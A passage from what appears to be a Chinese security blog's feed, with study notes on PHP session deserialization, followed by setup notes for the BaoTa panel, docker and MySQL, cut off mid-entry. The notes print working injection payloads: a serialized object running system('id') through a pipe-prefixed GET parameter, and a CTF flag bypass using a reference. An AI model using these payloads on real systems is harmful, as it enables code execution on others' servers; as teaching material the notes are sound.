title="php_binary方式存储"></a><code>php_binary</code>方式存储</h2><p>和<code>php_serialize</code>方式存储一样，要先声明存储格式为<code>php_binary</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;benben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ben&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;b&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">benben</span>=dazhuang&amp;b=666<br></code></pre></td></tr></table></figure><p>需要用二进制的方式查看</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420184444560.png" alt="image-20250420184444560"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</span><br>ACKbenbens:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;dazhuang&quot;</span>;SOHbs:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;666&quot;</span>;<br></code></pre></td></tr></table></figure><p>前面的<code>ACK</code>对应的就是<code>06</code>（键名<code>benben</code>的长度），<code>SOH</code>是<code>01</code>（键名<code>b</code>的长度）</p><h1 id="PHP-session反序列化漏洞"><a href="#PHP-session反序列化漏洞" class="headerlink" title="PHP session反序列化漏洞"></a>PHP session反序列化漏洞</h1><p>**漏洞成因：**当网站序列化并存储<code>session</code>，与反序列化并读取<code>session</code>的方式不同时，就可能导致<code>session</code>反序列化漏洞的产生</p><p>如下两个页面，第一个页面如下，可以以<code>php_serialize</code>的方式写进去进行存储</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190424176.png" alt="image-20250420190424176"></p><p>第二个页面如下，可以以<code>php</code>的方式进行读取</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420190441210.png" alt="image-20250420190441210"></p><p>在第二个页面可以通过序列化执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420185635290.png" alt="image-20250420185635290"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在第二个页面是没有提交的地方的，但可以在第一个页面中进行GET提交参数a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ben&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里可以在第一个页面进行写入，在第二个页面进行读取并执行命令</p><p>注意到这里提交写进去是以<code>php_serialize</code>的方式，但是读取的时候是以<code>php</code>方式进行读取的</p><p><strong><code>php</code>的读取方式是以竖线<code>|</code>为分隔符，竖线<code>|</code>前面的是键名，竖线<code>|</code>后面的就是要反序列化的内容</strong></p><p>在第一个页面提交GET参数<code>a</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这里是以<code>php_serialize</code>的方式写入的，最终存储的样子为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php_serialize：经过serialize()序列化处理的数组</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;|O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>当在第二个界面以<code>php</code>的方式去读取的时候</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># php：键名 + 竖线 + 经过serialize反序列化处理的值</span><br><br><span class="hljs-comment"># 当作键名的部分为</span><br>a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;ben&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;</span><br><span class="hljs-string"># 进行反序列化的部分为</span><br><span class="hljs-string">O:1:&quot;</span>D<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:13:&quot;</span><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-string">&quot;;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>对于进行反序列化的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>在前面的部分已经使用了<code>;&#125;</code>进行了闭合，满足了序列化数据的格式，所以后面剩余的<code>“;&#125;</code>就是无用的</p><p>所以最终会被反序列化的部分是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;D&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;system(&#x27;id&#x27;);&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192710093.png" alt="image-20250420192710093"></p><p>直接访问第二个页面就会得到命令执行的回显</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420192815930.png" alt="image-20250420192815930"></p><p>综上，<code>session</code>反序列化要满足有一个页面可以写入，还有一个页面可以读取，并且两个页面的方式是不一样的，就会出现<code>session</code>反序列化</p><h1 id="PHP-session反序列化例题"><a href="#PHP-session反序列化例题" class="headerlink" title="PHP session反序列化例题"></a>PHP session反序列化例题</h1><p>题目的<code>index.php</code>的源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>可以看到有个<code>hint.php</code>页面，访问得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>审计代码</strong></p><ul><li>在<code>index.php</code>页面中，启动了一个 PHP 会话，默认是使用<code>php</code>的方式，有一个<code>Flag</code>的类，其中有两个属性分别是<code>name</code>和<code>her</code>，在发序列化时会触发<code>__wakeup</code>魔术方法，先给<code>her</code>赋值为一个随机的1到10000的MD5值，并和<code>name</code>进行比较，条件满足就会包含<code>flag.php</code>页面，并输出flag，但是在这个页面中没有输入点</li><li>在<code>hint.php</code>页面中，声明了session的存储方式为<code>php_serialize</code>，并可以提交GET参数<code>a</code>，有输入的地方</li></ul><p>在这题中，满足了可以在<code>hint.php</code>页面中写入，可以在<code>index.php</code>页面中读取，并且两个页面的存储方式不一样，说明存在有session反序列化漏洞</p><p>要想读取flag，就要满足<code>name</code>和<code>her</code>的值相等，可以使用取地址符<code>&amp;</code>满足这个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name = &amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200436497.png" alt="image-20250420200436497"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 序列化后的结果</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p>在<code>hint.php</code>页面提交GET参数a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200809940.png" alt="image-20250420200809940"></p><p>然后直接访问<code>index.php</code>页面就可以得到flag了</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200826403.png" alt="image-20250420200826403"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>PHP反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署宝塔</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/</url>
    
    <content type="html"><![CDATA[<p>网址：<a href="https://www.bt.cn/new/download.html">https://www.bt.cn/new/download.html</a></p><p>安装命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -f /usr/bin/curl ];<span class="hljs-keyword">then</span> curl -sSO https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">else</span> wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">fi</span>;bash install_panel.sh ed8484bec<br></code></pre></td></tr></table></figure><p>最后会得到宝塔面板登录信息</p><p>可以使用命令进行修改配置</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/image-20250424114554547.png" alt="image-20250424114554547"></p><p>然后输入命令编号即可，习惯修改以下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">5修改面板密码<br>6修改面板用户名<br>8修改面板端口<br>28修改面板安全入口<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在kali部署docker和docker-compose</title>
    <link href="/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/"/>
    <url>/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/</url>
    
    <content type="html"><![CDATA[<p>更新系统包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-cli<br></code></pre></td></tr></table></figure><p>验证是否安装成功（拉取hello-word镜像）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>出现报错，有无法下载的就加命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose --fix-missing<br></code></pre></td></tr></table></figure><p>更换docker镜像源（一键搞好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看已有镜像</span><br>docker images<br><br><span class="hljs-comment"># 查看正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器</span><br>docker ps -a<br><br><span class="hljs-comment"># 构建镜像</span><br>docker build -t 镜像名字 .<br><br><span class="hljs-comment"># 运行镜像</span><br>docker run -itd -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名字&gt; &lt;镜像名字&gt;<br>如：docker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 以 /bin/sh 权限进入容器交互界面</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 启动容器</span><br>docker start &lt;容器名或ID&gt;<br><br><span class="hljs-comment"># 暂停容器</span><br>docker stop &lt;容器名或ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署MySQL</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/</url>
    
    <content type="html"><![CDATA[<p>更新软件包列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装 MySQL 服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install mysql-server<br></code></pre></td></tr></table></figure><p>启动MySQL服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl start mysql<br></code></pre></td></tr></table></figure><p>设置开机自启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> mysql<br></code></pre></td></tr></table></figure><p>检查MySQL服务状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status mysql<br></code></pre></td></tr></table></figure><p>运行安全脚本，可以设置 root 密码、移除匿名用户、禁止 root 远程登录、移除测试数据库等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql_secure_installation<br></code></pre></td></tr></table></figure><p>登录MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -u root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署docker和docker-compose和使用命令</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>更新系统包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装docker（版本为 26.1.3<del>ubuntu1</del>24.04.1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker.io<br></code></pre></td></tr></table></figure><p>验证是否安装成功（拉取hello-word镜像）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>更换docker镜像源（一键搞好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 